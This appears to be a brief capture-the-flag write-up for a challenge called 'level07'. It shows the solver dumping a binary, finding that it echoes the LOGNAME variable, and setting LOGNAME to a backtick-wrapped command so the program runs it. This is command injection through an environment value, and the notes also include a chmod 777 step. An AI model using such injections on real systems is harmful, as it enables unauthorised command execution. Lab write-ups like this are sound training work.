chmod 777 .

# We found an executable './level07'
# The executable print 'level07'
# We changed his name and re-execute it, it printed 'level07' again

# We dumped the executable:
hexdump -C ./level07
# We noticed that he echo the value of the env variable 'LOGNAME'

export LOGNAME=\`getflag\`
./level07

# TADAAAAAA
